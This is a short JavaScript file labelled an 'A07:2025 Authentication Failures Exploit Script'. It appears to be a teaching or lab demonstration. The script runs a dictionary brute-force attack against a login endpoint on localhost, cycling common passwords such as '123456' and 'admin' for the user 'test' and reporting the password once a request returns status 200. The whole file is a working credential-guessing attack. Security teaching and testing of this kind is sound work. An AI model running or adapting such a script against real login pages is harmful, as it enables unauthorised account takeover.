// A07:2025 Authentication Failures Exploit Script

const wordlist = [
  "123456",
  "password",
  "12345678",
  "qwerty",
  "123456789",
  "12345",
  "1234",
  "111111",
  "1234567",
  "test123",
  "admin",
];

const username = "test";

async function bruteForce() {
  console.log(`Brute force on /auth/login... for username ${username}`);

  for (const pwd of wordlist) {
    console.log(`Trying password: ${pwd}`);
    const res = await fetch("http://localhost:3000/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: username,
        password: pwd,
      }),
    });

    if (res.status === 200) {
      console.log(`[SUCCESS] Password found! It is: ${pwd}`);
      break;
    } else {
      console.log(`[FAILED] status: ${res.status}`);
    }
  }
}

bruteForce();
